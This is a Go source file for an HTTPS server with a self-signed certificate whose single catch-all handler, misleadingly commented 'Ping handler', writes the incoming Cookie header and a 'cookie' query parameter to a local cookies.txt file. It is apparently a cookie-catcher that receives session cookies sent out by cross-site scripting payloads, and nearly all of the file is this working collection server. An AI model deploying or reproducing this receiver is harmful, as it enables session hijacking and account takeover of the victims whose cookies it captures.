package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/golang/glog"
)

func main() {
	r := gin.Default()

	// Ping handler
	r.GET("/:page", func(c *gin.Context) {

		val := c.Request.Header["Cookie"]

		f, err := os.Create("./cookies.txt")
		defer f.Close()

		if err != nil {
			glog.Warning("Cannot open cookies file")
		}

		// Get time
		t := time.Now()

		for _, cookie := range val {
			l := fmt.Sprintf("\n\n--- %s ---\nCookie (Header): %s\n", t, cookie)
			f.Write([]byte(l))
		}

		cookie := c.Query("cookie")
		l := fmt.Sprintf("--- %s ---\nCookie (Param): %s\n", t, cookie)
		f.Write([]byte(l))
		if err != nil {
			glog.Fatal("Error writing to file")
		}
	})

	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1658),
		Subject: pkix.Name{
			Organization:  []string{"MantisSTS"},
			Country:       []string{"UK"},
			Province:      []string{"Devon"},
			Locality:      []string{"Plymouth"},
			StreetAddress: []string{"MantisSTS"},
			PostalCode:    []string{"MantisSTS"},
		},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(10, 0, 0),
		SubjectKeyId: []byte{1, 2, 3, 4, 6},
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	pub := &priv.PublicKey

	// Sign the certificate
	certificate, _ := x509.CreateCertificate(rand.Reader, cert, cert, pub, priv)

	certBytes := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certificate})
	keyBytes := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	// Generate a key pair from your pem-encoded cert and key ([]byte).
	x509Cert, _ := tls.X509KeyPair(certBytes, keyBytes)

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{x509Cert}}
	server := http.Server{Addr: ":443", Handler: r, TLSConfig: tlsConfig}

	glog.Fatal(server.ListenAndServeTLS("", ""))
}
